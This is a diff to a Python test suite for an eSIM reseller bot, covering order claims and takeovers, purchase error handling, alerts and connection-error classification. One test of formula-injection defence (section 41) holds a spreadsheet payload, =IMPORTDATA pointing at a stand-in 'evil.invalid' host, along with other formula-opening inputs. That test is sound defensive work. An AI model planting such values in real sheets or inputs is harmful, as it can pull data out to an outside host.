@@ -23,6 +23,13 @@ import fulfillment_bot as fb          # noqa: E402
 import stellar_prices as sp           # noqa: E402
 import stellar_buyer as sb            # noqa: E402
 
+# The alert checks below are written against the minute rule (NOW_TOP passes,
+# NOW_MID is held). bot_common.throttle_ok, where present, remembers subjects
+# in a file across scenarios, so it is switched off here and tested on its own
+# (section 46).
+_REAL_THROTTLE_OK = sb._throttle_ok
+sb._throttle_ok = lambda: None
+
 fails: list[str] = []
 
 
@@ -50,9 +57,10 @@ class Resp:
 
 class Site:
     """waverole.com /api/orders: the queue, the claim, the reports."""
-    def __init__(self, orders, claim_by: str = "", fail_report: bool = False):
+    def __init__(self, orders, claim_by: str = "", fail_report: bool = False, old_site: bool = False):
         self.orders, self.claim_by, self.posts, self.gets = orders, claim_by, [], []
         self.fail_report = fail_report      # the site is unreachable when reporting
+        self.old_site = old_site            # predates takeover_from: ignores it
 
     def get(self, url, params=None, headers=None, timeout=None):
         self.gets.append(dict(params or {}))
@@ -65,7 +73,17 @@ class Site:
         self.posts.append(dict(json))
         if json.get("release"):
             return Resp(200, {"ok": True, "released": True})
+        if json.get("action") == "mail_claim":
+            # The site's mail lease as api/orders.js grants it. (A bare {"ok"}
+            # is no real site's answer: fb reads it as "the lock did not answer".)
+            return Resp(200, {"ok": True, "claim": True, "lease": f"{json.get('by')}#test"})
         if "claim" in json:
+            # takeover_from (2026-11-16): the claim MOVES to the asker's name,
+            # and only while takeover_from still holds it.
+            if (json.get("takeover_from") and not self.old_site and not getattr(self, "claim_reason", "")
+                    and self.claim_by == json["takeover_from"]):
+                self.claim_by = json["claim"]
+                return Resp(200, {"ok": True, "claimed": True, "by": json["claim"]})
             # The site's SET NX: the holder's own name is "yours already",
             # any other name is 409 (with a reason when the order is closed).
             if self.claim_by and (json["claim"] != self.claim_by or getattr(self, "claim_reason", "")):
@@ -103,12 +121,17 @@ PLANS = [plan("p-20d", "JC059", 10, 20, 212), plan("p-30d", "JC059", 10, 30, 213
 
 class StellarFake:
     def __init__(self, wallet=10000, statuses=("fulfilled",), create=202, with_install=True,
-                 esims_read=True, listings=None):
+                 esims_read=True, listings=None, answers=None):
         # create may be one answer or a sequence of them, so a replay under the
         # same idempotency key can be answered differently from the first try.
         self.wallet, self.statuses = wallet, list(statuses)
         self.create_codes = list(create) if isinstance(create, (list, tuple)) else [create]
         self.with_install, self.esims_read = with_install, esims_read
+        # Forced answers to reads: {"/plans/": 403, "/plans$": 500, ...}. A
+        # marker ending in '$' must END the url (the list endpoint); any other
+        # marker is a substring.
+        self.answers = dict(answers or {})
+        self.params = []                    # the params of every GET, in order
         # What GET /plans/{id} serves. It is the catalogue the scenario runs
         # with, because the buyer can now reach a single listing WITHOUT
         # downloading the catalogue -- the two must be the same world.
@@ -125,8 +148,14 @@ class StellarFake:
 
     def get(self, url, timeout=None, **kw):
         self.gets.append(url)
+        self.params.append(dict(kw.get("params") or {}))
+        for marker, code in self.answers.items():
+            if (url.endswith(marker[:-1]) if marker.endswith("$") else marker in url):
+                return Resp(code, {"error": {"code": "forced", "message": f"code {code}"}})
         if url.endswith("/wallet"):
             return Resp(200, {"data": {"currency": "EUR", "available_balance_cents": self.wallet}})
+        if url.endswith("/plans"):
+            return Resp(200, {"data": self.listings[:1], "meta": {"total": len(self.listings)}})
         if "/esims/" in url:
             if not self.esims_read:
                 return Resp(403, {"error": {"code": "forbidden", "message": "esims:read"}})
@@ -153,6 +182,10 @@ class StellarFake:
         if code == "timeout":                      # sent, never answered
             import requests
             raise requests.exceptions.ReadTimeout("no answer")
+        if code == "nodns":                        # never left: the name did not resolve
+            import requests
+            raise requests.ConnectionError("Max retries exceeded (Caused by NameResolutionError("
+                                           "\"Failed to resolve 'x' ([Errno 11001] getaddrinfo failed)\"))")
         if code == "noid":                         # accepted, but names no order
             return Resp(202, {"data": {"status": "processing"}})
         if code == 202:
@@ -314,7 +347,7 @@ def scenario(orders, stellar: StellarFake, ws: Ws | None = None, rows=None, clai
         return list(plans)
     sb.sp.fetch_plans = _fetch
     sb.stellar_rows = lambda: {r.sku: r for r in (rows if rows is not None else [sheet_row()])}
-    sb.fb.alert = lambda s, b: alerts.append((s, b))
+    sb.fb.alert = lambda s, b, **kw: alerts.append((s, b))
     sb.time.sleep = lambda s: sleeps.append(s)
     sb.SETTLE_WAIT_S = settle_wait
     st = sb.Stellar("k", session=stellar)
@@ -479,6 +512,8 @@ site, ws6, _, _ = scenario([order()], (f6 := StellarFake(wallet=100)))
 check("no Stellar order, no row", len(f6.creates) == 0 and len(ws6.rows) == 1)
 check("order NOT reported failed (it is not the order's fault)", not site.reports("failed"))
 check("top-up alert sent at the top of the hour", alerts and "wallet" in alerts[0][0], str(alerts))
+check("...and the claim is handed back: nothing was sent to Stellar (2026-11-16)",
+      len([p for p in site.posts if p.get("release")]) == 1, str(site.posts))
 site, _, _, _ = scenario([order()], StellarFake(wallet=100), now=NOW_MID)
 check("...and held mid-hour", not alerts)
 
@@ -511,6 +546,9 @@ check("order left pending on the site", not site.reports("failed") and not site.
 site, ws8, _, _ = scenario([order()], (f8b := StellarFake(statuses=("manual_review",))), ws=ws8)
 check("second run: no purchase, no second alert, no Stellar call at all",
       len(f8b.creates) == 0 and not alerts and not f8b.gets)
+check("...and it does not keep the claim: the review row keeps buyers away, the claim would "
+      "block the owner's reassign for good (2026-11-16)",
+      len([p for p in site.posts if p.get("release")]) == 1, str(site.posts))
 
 # ── 9. idempotency conflict ──────────────────────────────────────────────────
 print("\n9. 409 idempotency conflict -> review row blocks the next run")
@@ -534,6 +572,8 @@ sb.MAX_ORDERS_PER_RUN = 2
 many = [order(oid=f"WR-{i}") for i in range(4)]
 site, ws11, bought, _ = scenario(many, (f11 := StellarFake()))
 check("two bought, two left for the next run", len(f11.creates) == 2 and bought == 2)
+check("...and the two left over are never CLAIMED (a claim it will not act on holds them an hour)",
+      {p["order_id"] for p in site.posts if "claim" in p} == {"WR-0", "WR-1"}, str(site.posts))
 sb.MAX_ORDERS_PER_RUN = 5
 
 # ── 12. credentials the key cannot see ───────────────────────────────────────
@@ -555,7 +595,9 @@ check("nothing is bought and no row is written",
       not f14.creates and bought == 0 and len(ws14.rows) == 1)
 # It does ask ONE read-only question, because this is the only moment the key
 # is ever exercised without a paid customer behind it (section 28).
-check("...but the key is exercised: one wallet read", f14.gets == [f"{sb.BASE}/wallet"])
+check("...but the key is exercised: one wallet read and the smallest plan read",
+      f14.gets == [f"{sb.BASE}/wallet", f"{sb.BASE}/plans"] and f14.params[1] == {"per_page": 1},
+      f"{f14.gets} {f14.params}")
 check("...a key that works says nothing", not alerts)
 check("...and the balance stays out of a public log",
       "10000" not in log14 and "100.00" not in log14, log14)
@@ -682,7 +724,7 @@ check("...and the row goes to review, as for every unknown outcome", wsU.col(2, 
       wsU.col(2, sb.H_STATUS) if len(wsU.rows) > 1 else "no row")
 site, _, boughtK, _ = scenario([order("WR-TEST01"), order("WR-TEST02")], (fK := StellarFake(create=401)))
 check("a refused key ends the run at the first order: the second is not claimed, refused and released too",
-      len(fK.creates) == 1 and [p["order_id"] for p in site.posts if "claim" in p and not p.get("release")] == ["WR-TEST01"],
+      len(fK.creates) == 1 and {p["order_id"] for p in site.posts if "claim" in p and not p.get("release")} == {"WR-TEST01"},
       str(site.posts))
 
 # ── 20. a row that names no Stellar order is never re-bought ─────────────────
@@ -717,9 +759,17 @@ check("one alert, naming the row", alerts and "still processing" in alerts[0][0]
 site, _, _, _ = scenario([order()], StellarFake(statuses=("processing",)),
                          ws=Ws([receipt_row("WR-TEST01", sb.ST_PROCESSING)]), now=NOW_MID)
 check("...held mid-hour", not alerts)
-print("\n   fulfilled at Stellar but the key cannot read the credentials is the same story")
-site, _, _, _ = scenario([order()], StellarFake(esims_read=False), settle_wait=0)
-check("alerted, not delivered", alerts and "still fulfilled" in alerts[0][0], str(alerts))
+print("\n   fulfilled at Stellar but the order carries no credentials is the same story")
+site, _, _, _ = scenario([order()], StellarFake(with_install=False), settle_wait=0)
+check("alerted, not delivered", alerts and "still fulfilled" in alerts[0][0]
+      and not site.reports("fulfilled"), str(alerts))
+print("\n   ...while a key that may not READ the eSIM (403) is a key problem, said as one")
+site, ws22c, _, _ = scenario([order()], StellarFake(esims_read=False), settle_wait=0)
+check("the key alert, nothing delivered, the row still מעבד",
+      alerts and "key" in alerts[0][0] and not site.reports("fulfilled")
+      and ws22c.col(2, sb.H_STATUS) == sb.ST_PROCESSING and sb.TROUBLE["key"] is True, str(alerts))
+check("...and the claim is KEPT: this run's purchase was sent",
+      not [p for p in site.posts if p.get("release")], str(site.posts))
 print("\n   ...and a normal wait right after the purchase says nothing")
 site, _, _, _ = scenario([order()], StellarFake(statuses=("processing",)), settle_wait=0)
 check("no alert", not alerts, str(alerts))
@@ -830,7 +880,7 @@ class Refuses(StellarFake):
 
 for _code in (401, 403):
     alerts.clear()
-    sb.fb.alert = lambda s, b: alerts.append((s, b))
+    sb.fb.alert = lambda s, b, **kw: alerts.append((s, b))
     ok = sb.preflight(sb.Stellar("k", session=Refuses(_code)), now=NOW_TOP)
     check(f"{_code} -> not ready, and the owner is told", ok is False and len(alerts) == 1)
     check(f"   ...and the alert names the KEY, not an order",
@@ -1380,8 +1430,17 @@ check("the site says the customer was already mailed for this order: no mail, th
       and ws38.col(2, sb.H_STATUS) == sb.ST_ACTIVE and ws38.col(2, sb.H_SELL) == "6.99$",
       f"{mails} {ws38.col(2, sb.H_STATUS)}")
 
-site, _, _, _ = scenario([order()], StellarFake())
-check("an older site (no lease in the answer) still mails, once", len(mails) == 1, str(mails))
+class OldMailSite(Site):
+    """A site from before 2026-10-21: it answers 400 to the mail_claim action."""
+    def post(self, url, json=None, headers=None, timeout=None):
+        if json and json.get("action") == "mail_claim":
+            self.posts.append(dict(json))
+            return Resp(400, {"ok": False, "error": "unknown action"})
+        return super().post(url, json=json, headers=headers, timeout=timeout)
+
+
+site, _, _, _ = scenario([order()], StellarFake(), site=OldMailSite([order()]))
+check("an older site (400 to the lease) still mails, once", len(mails) == 1, str(mails))
 
 
 # -- the two buyers (GitHub and the network) and the takeover -----------------
@@ -1393,10 +1452,22 @@ check("held by the network's buyer: nothing bought, nothing reported",
 sb.TAKEOVER = ("net:stellar",)
 try:
     site, wsT, bought, logT = scenario([order()], (fT := StellarFake()), claim_by="net:stellar")
-    claims = [p["claim"] for p in site.posts if "claim" in p]
-    check("told the network's buyer is dead: the claim is taken under ITS name", claims[:2] == ["gha:stellar", "net:stellar"], str(claims))
+    claims = [(p["claim"], p.get("takeover_from")) for p in site.posts if "claim" in p]
+    check("told the network's buyer is dead: the claim is MOVED to our own name (takeover_from)",
+          claims[:2] == [("gha:stellar", None), ("gha:stellar", "net:stellar")], str(claims))
+    check("...the site now names us as the holder", site.claim_by == "gha:stellar", site.claim_by)
+    check("...the pre-purchase re-check is a plain claim, and it is ours",
+          claims[2:3] == [("gha:stellar", None)], str(claims))
     check("...and the order is bought once", bought == 1 and len(fT.creates) == 1, f"{bought} {fT.creates}")
     check("the log says it took over", "taken over from net:stellar" in logT, logT[-300:])
+    site, wsT, bought, _ = scenario([order()], (fT := StellarFake()), site=Site([order()], "net:stellar", old_site=True))
+    check("a site that predates takeover_from answers 409: nothing taken, nothing bought",
+          bought == 0 and not fT.creates and site.claim_by == "net:stellar"
+          and not site.reports("failed"), str(site.posts))
+    site, wsT, bought, _ = scenario([order()], (fT := StellarFake(create=401)), claim_by="net:stellar")
+    rel = [p for p in site.posts if p.get("release")]
+    check("a release after a takeover names OUR worker (the claim is ours now)",
+          len(rel) == 1 and rel[0]["claim"] == "gha:stellar", str(site.posts))
     site, wsT, bought, _ = scenario([order()], (fT := StellarFake()), claim_by="pc:DESKTOP")
     check("a holder that is not on the list is never taken over", bought == 0 and not fT.creates, str(site.posts))
     closed = Site([order()], "net:stellar")
@@ -1406,6 +1477,277 @@ try:
           bought == 0 and not fT.creates and len([p for p in site.posts if "claim" in p]) == 1, str(site.posts))
 finally:
     sb.TAKEOVER = ()
+
+
+# ── 39. an error after the claim (review 2026-11-16) ─────────────────────────
+# An exception inside handle() used to be only logged: the claim was kept for
+# its hour, the run said nothing was wrong, the orders duty reported success
+# and GitHub's backup stayed out for good.
+print("\n39. an error after the claim: the claim goes back when nothing was sent, and the run says so")
+import requests as _rq2                                             # noqa: E402
+
+
+def _released(site):
+    return [p for p in site.posts if p.get("release")]
+
+
+site, ws39, bought, _ = scenario([order()], (f39 := StellarFake(answers={"/plans/": 403})),
+                                 rows=[sheet_row(plan_id="p-30d")],
+                                 plans=_rq2.HTTPError("403", response=Resp(403, {})))
+check("a key without plans:read (the listing AND the catalogue 403): nothing bought, nothing reported",
+      not f39.creates and not site.reports("failed") and len(ws39.rows) == 1 and bought == 0, str(site.posts))
+check("...said as the KEY, the run marks it, and the claim goes back",
+      sb.TROUBLE["key"] is True and alerts and "key" in alerts[0][0] and len(_released(site)) == 1,
+      f"{alerts} {site.posts}")
+site, _, bought, _ = scenario([order()], (f39b := StellarFake(answers={"/plans/": 403})),
+                              rows=[sheet_row(plan_id="p-30d")])
+check("a refused single listing beside a catalogue that reads is no key problem: bought",
+      bought == 1 and len(f39b.creates) == 1 and sb.TROUBLE["key"] is False, str(f39b.creates))
+
+site, ws39c, _, _ = scenario([order()], (f39c := StellarFake(answers={"/wallet": 500})))
+check("an error before anything was sent (the wallet read): the claim goes back, the run counts it",
+      not f39c.creates and len(_released(site)) == 1 and sb.TROUBLE["errors"] == 1
+      and sb.TROUBLE["key"] is False and not site.reports("failed") and len(ws39c.rows) == 1,
+      f"{site.posts} {sb.TROUBLE}")
+site, _, _, _ = scenario([order()], StellarFake(answers={"/wallet": 403}))
+check("a wallet read refused by the key after the claim: the key, and the claim goes back",
+      sb.TROUBLE["key"] is True and len(_released(site)) == 1, f"{site.posts} {sb.TROUBLE}")
+
+site, ws39d, _, _ = scenario([order()], (f39d := StellarFake(answers={"/orders/": 500})))
+check("an error AFTER the purchase was sent: the claim is KEPT (only this buyer's replay is sure to find it)",
+      len(f39d.creates) == 1 and not _released(site) and sb.TROUBLE["errors"] == 1
+      and sb.TROUBLE["placed"] == 1 and ws39d.col(2, sb.H_STATUS) == sb.ST_PROCESSING,
+      f"{site.posts} {sb.TROUBLE}")
+
+site, _, _, _ = scenario([order()], (f39e := StellarFake(answers={"/orders/": 403})),
+                         ws=Ws([receipt_row("WR-TEST01", sb.ST_PROCESSING)]))
+check("settling an earlier purchase, the key refused: said, and the claim goes back (nothing was sent THIS time)",
+      sb.TROUBLE["key"] is True and len(_released(site)) == 1 and not f39e.creates
+      and not site.reports("failed"), f"{site.posts} {sb.TROUBLE}")
+site, _, _, _ = scenario([order()], StellarFake(answers={"/orders/": 500}),
+                         ws=Ws([receipt_row("WR-TEST01", sb.ST_PROCESSING)]))
+check("...a settle read that merely failed: counted, and the claim goes back (the row guards the money)",
+      sb.TROUBLE["errors"] == 1 and sb.TROUBLE["key"] is False and len(_released(site)) == 1, str(sb.TROUBLE))
+
+site, _, _, _ = scenario([order()], StellarFake(), rows=many_rows, plans=[])
+check("a catalogue that cannot be trusted: the claim goes back and the run counts it",
+      len(_released(site)) == 1 and sb.TROUBLE["errors"] == 1, f"{site.posts} {sb.TROUBLE}")
+
+site, ws39k, _, _ = scenario([order()], (f39k := StellarFake(create="nodns")))
+check("a purchase that never left this machine (DNS): no row, nothing reported, the claim goes back",
+      len(f39k.creates) == 1 and len(ws39k.rows) == 1 and not site.reports("failed")
+      and len(_released(site)) == 1 and sb.TROUBLE["errors"] == 1, f"{site.posts} {sb.TROUBLE}")
+
+site, _, _, _ = scenario([order()], StellarFake())
+check("a clean run starts from a clean count", sb.TROUBLE == {"key": False, "placed": 1, "errors": 0}, str(sb.TROUBLE))
+
+print("\n   the readiness check reads one listing too")
+alerts.clear()
+ok = sb.preflight(sb.Stellar("k", session=StellarFake(answers={"/plans$": 403})), now=NOW_TOP)
+check("a key that reads the wallet but not the plans is NOT ready, and the owner is told",
+      ok is False and len(alerts) == 1 and "key" in alerts[0][0].lower() and "/plans" in alerts[0][1], str(alerts))
+alerts.clear()
+ok = sb.preflight(sb.Stellar("k", session=StellarFake(answers={"/plans$": 500})), now=NOW_TOP)
+check("a plan read that merely failed: not ready, and quiet", ok is False and not alerts, str(alerts))
+
+
+# ── 40. once the first answer is unknown, nothing else ends the call quietly ─
+print("\n40. unknown first answer, then busy / 402 / no answer at all -> a review row, never 'failed'")
+for label, seq in (("503", [500, 503]), ("429", ["timeout", 429]), ("402", [500, 402]),
+                   ("a replay that could not be sent", [500, "nodns"])):
+    site, ws40, _, _ = scenario([order()], (f40 := StellarFake(create=seq)))
+    check(f"{label}: a review row, nothing reported",
+          len(f40.creates) == 2 and len(ws40.rows) == 2 and ws40.col(2, sb.H_STATUS) == sb.ST_REVIEW
+          and not site.reports("failed") and not site.reports("fulfilled"),
+          f"{f40.creates} {ws40.rows[1:]} {site.posts}")
+    check(f"{label}: the owner is told at once, and the claim is kept",
+          alerts and "needs a look" in alerts[-1][0] and not _released(site), f"{alerts} {site.posts}")
+site, ws40b, _, _ = scenario([order()], StellarFake(create=402))
+check("a 402 on the FIRST answer is still just the wallet (no row)",
+      len(ws40b.rows) == 1 and alerts and "wallet" in alerts[0][0], str(alerts))
+
+
+# ── 41. formula injection ────────────────────────────────────────────────────
+print("\n41. the customer's own words never run as a formula in the owner's sheet")
+evil = order(device='=IMPORTDATA("https://evil.invalid/x")')
+evil["customer_email"] = "+buyer@example.com"
+_, ws41, _, _ = scenario([evil], StellarFake())
+check("a device that opens like a formula is written as text",
+      ws41.col(2, sb.H_DEVICE) == "'" + '=IMPORTDATA("https://evil.invalid/x")', ws41.col(2, sb.H_DEVICE))
+check("...so is an address", ws41.col(2, sb.H_MAIL) == "'+buyer@example.com", ws41.col(2, sb.H_MAIL))
+check("the cells the bot builds itself are untouched (money, the '-' of no discount, links)",
+      ws41.col(2, sb.H_SELL) == "6.99$" and ws41.col(2, sb.H_SALE) == "-" and ws41.col(2, sb.H_BUY) == "2.48$"
+      and ws41.col(2, "Link - esim.dog").endswith("/orders/so-1")
+      and ws41.col(2, "Link - waverole").startswith("https://"), str(ws41.rows[1]))
+for raw, want in (("=1+1", "'=1+1"), ("@SUM(A1)", "'@SUM(A1)"), ("-2+3", "'-2+3"), ("+1", "'+1"),
+                  ("\t=1", "'\t=1"), ("\r=1", "'\r=1"), ("  =1", "'  =1"), ("＝1", "'＝1"),
+                  ("iPhone 15 Pro", "iPhone 15 Pro"), ("a=b", "a=b"), ("", ""), (None, "")):
+    check(f"as_text({raw!r})", sb.as_text(raw) == want, repr(sb.as_text(raw)))
+
+
+# ── 43. the claim is re-asserted right before the money moves ────────────────
+print("\n43. a claim taken over while this run read the catalogue: nothing is bought")
+
+
+class Snatched(Site):
+    """A backup takes the claim over between this run's claim and its purchase."""
+    def post(self, url, json=None, headers=None, timeout=None):
+        if json and "claim" in json and not json.get("release") \
+                and any("claim" in p and not p.get("release") for p in self.posts):
+            self.posts.append(dict(json))
+            return Resp(409, {"ok": False, "claimed": False, "by": "gha:stellar"})
+        return super().post(url, json=json, headers=headers, timeout=timeout)
+
+
+sb.WORKER = "net:stellar"
+try:
+    site, ws43, bought, log43 = scenario([order()], (f43 := StellarFake()), site=Snatched([order()]))
+finally:
+    sb.WORKER = "gha:stellar"
+check("nothing bought, no row, nothing reported, nothing released",
+      not f43.creates and len(ws43.rows) == 1 and not site.reports("failed")
+      and not _released(site) and bought == 0, str(site.posts))
+check("...the re-check was a plain claim (no takeover)",
+      [p.get("takeover_from") for p in site.posts if "claim" in p] == [None, None], str(site.posts))
+check("...neither a purchase nor an error to the orders duty",
+      sb.TROUBLE["errors"] == 0 and sb.TROUBLE["placed"] == 0 and sb.TROUBLE["key"] is False, str(sb.TROUBLE))
+check("...and the log says why", "no longer ours" in log43, log43[-300:])
+
+
+class RecheckDown(Site):
+    """The site cannot be asked at the re-check."""
+    def post(self, url, json=None, headers=None, timeout=None):
+        if json and "claim" in json and not json.get("release") \
+                and any("claim" in p and not p.get("release") for p in self.posts):
+            raise _rq2.ConnectionError("site unreachable")
+        return super().post(url, json=json, headers=headers, timeout=timeout)
+
+
+site, ws43b, _, _ = scenario([order()], (f43b := StellarFake()), site=RecheckDown([order()]))
+check("a re-check that cannot be asked buys nothing and counts as an error",
+      not f43b.creates and len(ws43b.rows) == 1 and sb.TROUBLE["errors"] == 1, f"{site.posts} {sb.TROUBLE}")
+
+
+# ── 45. which connection errors can have spent money (Windows too) ───────────
+print("\n45. never sent vs may have reached, by type first and on Windows")
+import socket as _socket                                            # noqa: E402
+import ssl as _ssl                                                  # noqa: E402
+from urllib3.exceptions import (MaxRetryError as _MRE, NameResolutionError as _NRE,  # noqa: E402
+                                NewConnectionError as _NCE, ProtocolError as _PE, SSLError as _U3SSL)
+
+_dns = _rq2.ConnectionError(_MRE(None, "/api/v1/orders",
+                                 _NRE("wholesale.invalid", None, _socket.gaierror(11001, "getaddrinfo failed"))))
+check("a DNS failure (urllib3's own type) never left", sb.never_sent(_dns) and not sb.reached_stellar(_dns))
+check("Windows' DNS words alone never left",
+      sb.never_sent(_rq2.ConnectionError("Failed to resolve 'x' ([Errno 11001] getaddrinfo failed)")))
+check("a refused connect on Windows never left",
+      sb.never_sent(_rq2.ConnectionError("[WinError 10061] No connection could be made because "
+                                         "the target machine actively refused it")))
+check("a connect timeout never left", sb.never_sent(_rq2.exceptions.ConnectTimeout("connect timed out")))
+check("a certificate check that failed (a PC clock that is wrong) never left",
+      sb.never_sent(_rq2.exceptions.SSLError(_MRE(None, "/x", _U3SSL(_ssl.SSLCertVerificationError(
+          1, "[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: certificate is not yet valid"))))))
+check("a handshake failure never left",
+      sb.never_sent(_rq2.exceptions.SSLError("[SSL: SSLV3_ALERT_HANDSHAKE_FAILURE] sslv3 alert handshake failure")))
+check("an SSL error while reading the answer MAY have reached",
+      not sb.never_sent(_rq2.exceptions.SSLError("EOF occurred in violation of protocol (_ssl.c:2427)")))
+check("WinError 10060 on an open connection MAY have reached",
+      not sb.never_sent(_rq2.ConnectionError(_PE("Connection aborted.", OSError(
+          "[WinError 10060] A connection attempt failed because the connected party did not properly respond")))))
+check("a reset after the request MAY have reached",
+      not sb.never_sent(_rq2.ConnectionError("[WinError 10054] An existing connection was forcibly closed")))
+check("an exception that says nothing MAY have reached", not sb.never_sent(RuntimeError("boom")))
+try:
+    try:
+        raise _NCE(None, "Failed to establish a new connection")
+    except Exception:
+        raise _rq2.ConnectionError("RemoteDisconnected('Remote end closed connection')")
+except Exception as _ctx:
+    _late = _ctx
+check("an older connect failure in the implicit context is not this one's cause",
+      not sb.never_sent(_late), repr(_late))
+
+
+# ── 46. the hourly alert, on the PCs ─────────────────────────────────────────
+print("\n46. on the PCs a subject mails at most once an hour (bot_common.throttle_ok)")
+import types as _types                                              # noqa: E402
+_seen: list = []
+
+
+def _fake_throttle(key, every_s):
+    _seen.append((key, every_s))
+    return [k for k, _ in _seen].count(key) == 1
+
+
+_had, _old = hasattr(sb.fb, "throttle_ok"), getattr(sb.fb, "throttle_ok", None)
+_gh = os.environ.pop("GITHUB_ACTIONS", None)
+_bc = sys.modules.get("bot_common")
+sb._throttle_ok = _REAL_THROTTLE_OK
+try:
+    sb.fb.throttle_ok = _fake_throttle
+    alerts.clear()
+    sb.alert_hourly("wallet too low for WR-T46", "x", NOW_MID)
+    sb.alert_hourly("wallet too low for WR-T46", "x", NOW_TOP)
+    sb.alert_hourly("Stellar refused the key", "x", NOW_MID)
+    check("the first mail of a subject goes at once, mid-hour too; the repeat is held, top of the hour or not",
+          [a[0] for a in alerts] == ["[stellar] wallet too low for WR-T46", "[stellar] Stellar refused the key"],
+          str(alerts))
+    check("...asked per subject, for an hour",
+          _seen[0] == ("stellar:wallet too low for WR-T46", 3600) and all(e == 3600 for _, e in _seen), str(_seen))
+    sb.fb.throttle_ok = lambda k, e: (_ for _ in ()).throw(OSError("disk"))
+    alerts.clear()
+    sb.alert_hourly("held", "y", NOW_MID)
+    sb.alert_hourly("sent", "y", NOW_TOP)
+    check("a throttle that raises falls back to the minute rule", [a[0] for a in alerts] == ["[stellar] sent"],
+          str(alerts))
+    sb.fb.throttle_ok = _fake_throttle
+    os.environ["GITHUB_ACTIONS"] = "true"
+    alerts.clear()
+    _seen.clear()
+    sb.alert_hourly("gh", "z", NOW_MID)
+    sb.alert_hourly("gh", "z", NOW_TOP)
+    check("on GitHub (a fresh machine every run, the file would forget) the minute rule stays",
+          [a[0] for a in alerts] == ["[stellar] gh"] and not _seen, f"{alerts} {_seen}")
+    os.environ.pop("GITHUB_ACTIONS", None)
+    del sb.fb.throttle_ok
+    sys.modules["bot_common"] = _types.ModuleType("bot_common")
+    alerts.clear()
+    sb.alert_hourly("none", "z", NOW_MID)
+    sb.alert_hourly("none", "z", NOW_TOP)
+    check("no throttle_ok anywhere: the minute rule", [a[0] for a in alerts] == ["[stellar] none"], str(alerts))
+finally:
+    if _bc is not None:
+        sys.modules["bot_common"] = _bc
+    if _had:
+        sb.fb.throttle_ok = _old
+    elif hasattr(sb.fb, "throttle_ok"):
+        del sb.fb.throttle_ok
+    if _gh is not None:
+        os.environ["GITHUB_ACTIONS"] = _gh
+    else:
+        os.environ.pop("GITHUB_ACTIONS", None)
+    sb._throttle_ok = lambda: None
+
+
+# ── 47. the run's budget counts from its first line ──────────────────────────
+print("\n47. the budget includes the queue read and the sheet open")
+_clock = [0.0]
+
+
+class SlowQueue(Site):
+    def get(self, url, params=None, headers=None, timeout=None):
+        _clock[0] += sb.RUN_BUDGET_S + 1.0      # the queue read alone spent the budget
+        return super().get(url, params=params, headers=headers, timeout=timeout)
+
+
+_mono = sb.time.monotonic
+sb.time.monotonic = lambda: _clock[0]
+try:
+    site, _, bought, _ = scenario([order()], (f47 := StellarFake()), site=SlowQueue([order()]))
+finally:
+    sb.time.monotonic = _mono
+check("a queue read that spent the budget leaves the order for the next run, unclaimed",
+      bought == 0 and not f47.creates and not [p for p in site.posts if "claim" in p], str(site.posts))
 
 
 # ── summary (last, so it gates the exit code) ────────────────────────────────
